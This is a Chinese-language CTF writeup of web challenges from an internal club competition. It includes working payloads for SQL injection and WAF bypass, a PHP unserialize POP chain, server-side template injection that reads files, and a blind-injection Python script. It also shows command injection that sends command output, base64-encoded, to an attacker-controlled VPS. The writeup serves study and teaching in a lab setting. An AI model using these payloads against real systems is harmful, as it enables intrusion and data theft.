## MakerCTF writeup





这一次水了一下协会主办的内部ctf感觉自己还是菜啊说一下吧



### Web

#### 1.babysqli

```
明写的博客总是被人日，于是他一气之下写了一套超级牛逼的WAF，大黑阔们还能绕过吗?
hint:用户名为admin
hint1:
waf代码
if(preg_match("/*|#|;|,|is|file|drop|union|select|ascii|mid|from|(|)|or|\^|=|<|>|like|regexp|for|and|limit|file|--|||&|".urldecode('%09')."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i",$username)){
die('wafed by pupiles');
}
$password的过滤同$username
数据库连接代码
mysql_query("SELECT * FROM pupiles_admin where username = '".$username."' and passwd = '".md5($passwd)."'");
hint2:
先想想怎么绕过注释符
```

这个题实在没有想起来怎么做

提示叫我们试试怎么绕过注释符号 百度了一下

最常见的几种注释

--  -  #  ;  %00 全部试了一下都不可以于是放弃

然后看writeup的时候get到了新的知识点

某些特定情况下可以使用`反引号作注释

前提就是在可以使用列名的情况下，例如`order by` `group by` `having`，后面都会跟上一个列名

使用反引号时，虽然我们只输入了一个，但是mysql会自动帮我们加上后面的那个，这样我们就可以把反引号后面所有东西都当作是一个列名，从而起到注释作用

里我们可以使用`group by`语句来构造

因为能过滤的基本都被过滤了，不太可能用查询语句了，利用万能密码绕过

但是由于`group by`后面跟的这个列名并不存在，会报错，所以加个`@`抑制报错





妈个鸡  电脑死机全部没保存  接下来writeup懒得写了！！！！

、





### easy bypass

当我们给`hash_hmac`第二个参数传递的值为数组的时候，会返回`false`

这时`secret`的值我们就可以控制为`false`

本地输出一下

```
php > echo hash_hmac('sha256', 1, false);
41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523

```

Payload

```
hmac=41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523&host=1&nonce[]=1

```

即可绕过验证，获得flag`MiniLCTF{3asy_hm4c_Byp4ss_for_U}`

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frebentdshj30kr0di0v1.jpg)

### easy_unserialize

```
蛋黄是一只懒惰的肥猫。有一天他想瞄一眼flag，但是flag被层层的php魔法拦住了。你能帮他嘛？

```

需要了解一下php的类

利用实例化类时会自动执行`__construct()`函数来给变量赋值，以达到我们想要的结果

在`gg`类中，`$this->gg `调用了`start`类中的`get1()`方法

利用

```
public function __construct()
{
  $this->gg = new start();
}

```

只要我们实例化一个`gg`类就可以让`$this->gg`变成`start`的一个实例，从而达到调用`get1()`方法的目的

往下看，在`cat`类中，我们看到一个`__invoke()`魔法函数，里面是一个`echo`，想到如果`echo`一个类的话，就会去调用`__toString()`魔法函数，而后面的`test`类中确实有一个`__toString()`，而且还调用了`getFlag()` 方法，正式我们想要达到的目的

返回来看`__invoke()`，当脚本尝试将对象调用为函数时，调用`__invoke()`方法

仔细找一下，有没有可能将类当作函数来调用的地方

在`start`类中，我们看到

```
public function get1()
{
    $s1 = $this->start1;
    $s2 = $this->start2;
    $s1($s2);
}

```

我们只要让`$this->start1 = new cat()`同时 `$htis->start2 = new test2()`即可，因为我们之前已经实例化了一个`start`类，所以用跟前面同样的方法我们就可以达到目的

这样`$s1($s2)`就会变成一个`cat`类被当成一个函数并将一个`test2`类当作参数传入，从而达到调用`__invoke()`函数的目的，然后接着去调用`__toString()`

再看`__toString()`，里面`$this->a`调用了`flag`类中的`gatFlag()`方法，还是之前的思路，将`$this->a`实例化为`flag`的一个类

得到最终的poc

```
<?php
class gg
{
    private $gg;
    public function __construct()
    {
        $this->gg = new start();
    }
}
class start
{
    private $start1;
    private $start2;
    public function __construct()
    {
        $this->start1 = new cat();
        $this->start2 = new test2();
    }
}

class cat{}

class test2
{
    private $a;
    public function __construct()
    {
        $this->a = new flag();
    }
}

class flag{}

$test = new gg();
echo urlencode(serialize($test));
?>

```

运行一下得到payload

```
O%3A2%3A%22gg%22%3A1%3A%7Bs%3A6%3A%22%00gg%00gg%22%3BO%3A5%3A%22start%22%3A2%3A%7Bs%3A13%3A%22%00start%00start1%22%3BO%3A3%3A%22cat%22%3A0%3A%7B%7Ds%3A13%3A%22%00start%00start2%22%3BO%3A5%3A%22test2%22%3A1%3A%7Bs%3A8%3A%22%00test2%00a%22%3BO%3A4%3A%22flag%22%3A0%3A%7B%7D%7D%7D%7D

```

传入得到`MiniLCTF{eaSy_pHp_Uns3r1zal1z3_}`

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frebdt2n18j30az0520t9.jpg)

### CURL

```
没过滤全

```

命令注入

payload

```
curl=vpsip:port/`ls|base64`

```

我们也可以加上`head`和`tail`参数来限制返回的行数

例如

```
ls|base64|head -n 2|tail -n 1

```

空格使用`%09`绕过

在服务器上监听

```
Listening on [0.0.0.0] (family 0, port 2333)
Connection from 45.40.207.251 53920 received!
GET /LS02eGFramRoY2ZoY25zawotLTd4YWJmOHNhaGRjaGZ1ZHkudHh0CmNzcwppbmRleC5waHAK HTTP/1.1
User-Agent: curl/7.38.0

```

用base64解码一下`LS02eGFramRoY2ZoY25zawotLTd4YWJmOHNhaGRjaGZ1ZHkudHh0CmNzcwppbm`

得到

```
--6xakjdhcfhcnsk
--7xabf8sahdchfudy.txt
css
index.php

```

直接访问`—7xabf8sahdchfudy.txt`得到flag`MiniLCTF{Y0u_G3t_1t_2333}`

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frebcxoeh2j30c905w0t8.jpg)

这题学长说它是出题失误了，我这里说一下正解

其实本不能使用`%09`绕过空格，而是要使用`{,,}`这种形式

所以payload如下

```
vpsip:port/`{ls,-a}|base64`
我也不知道为什么一定要加-a参数，但是亲测bash里确实如此，有知道的师傅，希望可以在评论区留言（请开代理）

```

和上面一样，解码即可获得文件名`--7xabf8sahdchfudy.txt`

这里要注意了，因为这里文件名前面带有`--`，他会把后面的内容当作一个字符串，但是又没有中间空格，会报错

所以必须我们不能直接`cat --7xabf8sahdchfudy.txt`

需要通过`cat -- --7xabf8sahdchfudy.txt`才可以

构造

```
vpsip:port/`{cat,--,--7xabf8sahdchfudy.txt}|base64`

```

解码获得flag

我也尝试了不加base64，但是发现打印出来没有flag中的`{}`，是有问题的，保险起见还是用base64编码一下



### 幸运数字



这个自己写一下 



这个题是模板注入

所谓模板注入也就是用户可控输入参数使得可以进行代码执行等危险操作（渲染的模版内容受到我们的控制，所以我们要使用模版注入，插入在服务器端执行的代码）

先试个`[[2*10]]`

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frghc3ixjij30e50aut9f.jpg)

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frghc92j1hj30dz0453yw.jpg)

成功执行，说明确实是模版注入没错

这本应该是{{}} 但是原本执行不成功所以只能使用[[]]

20 表示了里面的表达式执行成功

那么输入`[[config]]`

发现爆出了很多东西

得到

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frghdi1bxej313x0a479b.jpg) 

得到提示是一个路径 直接访问路径是不成功的 但是我们可以尝试其他方法

首先 `''.__class__` 可以访问到字符串的类型对象(关于python中的类型对象参见[Python Types and Objects](http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html))

[![20170530149613122259818.png](http://ony7wielg.bkt.clouddn.com/20170530149613122259818.png)](http://ony7wielg.bkt.clouddn.com/20170530149613122259818.png) 

因为python中所有的对象都是从Object逐级继承来的, 类型对象也不除外, 所有我们就可以调用对象的 `__base__` 方法访问该对象所继承的对象

[![20170530149613167899580.png](http://ony7wielg.bkt.clouddn.com/20170530149613167899580.png)](http://ony7wielg.bkt.clouddn.com/20170530149613167899580.png)20170530149613167899580.png

或者使用 `__mro__`(Method Resolution Order) 直接获得对象的继承链, python用这个方法来确定对象方法解析的顺序

[![20170530149613202779829.png](http://ony7wielg.bkt.clouddn.com/20170530149613202779829.png)](http://ony7wielg.bkt.clouddn.com/20170530149613202779829.png)20170530149613202779829.png

当我们访问到Object的类型对象的时候, 就可以用 `__subclasses__()`来获得当前环境下能够访问的所有对象.

因为调用对象的 `__subclasses__()` 方法会返回当前环境中所有继承于该对象的对象.

我们仔细过一遍环境里面存在的对象, 首先引起我们注意的肯定就是这个python内建的file对象

`[[''.__class__.__mro__[2].__subclasses__()]]`或者`[[(1).__class__.__base__.__subclasses__()]]`

![img](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg) 

看到`file`，又有刚才获得的路径，我们可以读取文件了

`[[''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()]]`

得到flag

关于模板注入有Kluas的总结的很详细

[模板注入](http://codeqi.top/2018/05/19/MiniLCTF-Writeup/) 





### baby sqli2

```
小明刚写的WAF就被打脸，于是不服气的小明升级了新的waf，大黑客们还能绕过吗

```

发现注释符，逻辑连接词都被过滤了

猜测后台判断语句为`$username == 'admin'`，如果是这样的话，我们就利用弱类型来绕过

如`0 == 'admin'`就会返回1，绕过验证，而`1 == 'admin'`返回空

发现`^`异或符没有被过滤

这样就有办法了，我们可以通过异或来构造这个`0`

测试一下

```
php > echo 'admin'^1^1;
0
php > echo 'admin'^1;
1

```

但是我们还要闭合后面的`'`

```
php > echo 'admin'^1^'1';
0
php > echo 'admin'^0^'1';
1

```

成功

利用`sql1`给的查询语句知道字段名是`passwd`

payload

```
username=admin'^(ascii(mid((passwd)from(1)))>=32)^'1&passwd=123

```

当`ascii(mid((passwd)from(1)))>=10`为真时，返回1，所以username的值就是0，返回`passwd is wrong`，当`ascii(mid((passwd)from(1)))>=10`为假时，返回0，username的值这是就是1，返回`wafed by pupiles`

利用这点我们就可以盲注了

脚本如下

```python
import requests
url = 'http://45.40.207.251:8002/login.php'
s = requests.Session()
passwd = ''
for l in range(1,33):
    for c in range(32,133):
        username = "admin'^(ascii(mid((passwd)from(%d)))>=%d)^'1'='1" % (l,c)
        data = {'username':username, 'passwd':123}
        html = s.post(url,data=data).text
        if 'admin' in html:
            passwd += chr(c - 1)
            print passwd
            break

```

